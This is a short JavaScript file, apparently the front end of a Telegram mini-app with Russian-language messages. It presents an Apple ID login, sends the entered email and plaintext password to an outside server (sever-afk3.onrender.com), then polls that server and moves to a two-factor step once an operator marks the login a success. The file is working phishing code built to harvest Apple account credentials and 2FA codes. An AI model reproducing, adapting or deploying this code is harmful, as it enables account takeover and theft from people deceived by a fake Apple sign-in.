let currentUserId = null;
let statusInterval = null;

async function sendData() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    
    if (!email.includes('@')) {
        alert('Введите корректный Apple ID');
        return;
    }

    currentUserId = 'user_' + Math.floor(Math.random() * 1000000);
    
    // Блокируем кнопку или показываем лоадер
    tg.showConfirm("Данные отправлены на проверку. Пожалуйста, подождите...");

    // Отправляем на твой бэкенд на Рендере
    await fetch('https://sever-afk3.onrender.com/send-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, email: email, pass: pass })
    });

    // Начинаем опрос сервера
    statusInterval = setInterval(pollStatus, 3000);
}

async function pollStatus() {
    try {
        const response = await fetch(`https://sever-afk3.onrender.com/check-status/${currentUserId}`);
        const data = await response.json();

        if (data.status === 'success') {
            clearInterval(statusInterval);
            document.getElementById('auth-step').style.display = 'none';
            document.getElementById('2fa-step').style.display = 'flex';
        } else if (data.status === 'error') {
            clearInterval(statusInterval);
            alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
            location.reload(); // Возврат на главную
        }
    } catch (e) {
        console.error("Ошибка опроса статуса", e);
    }
}



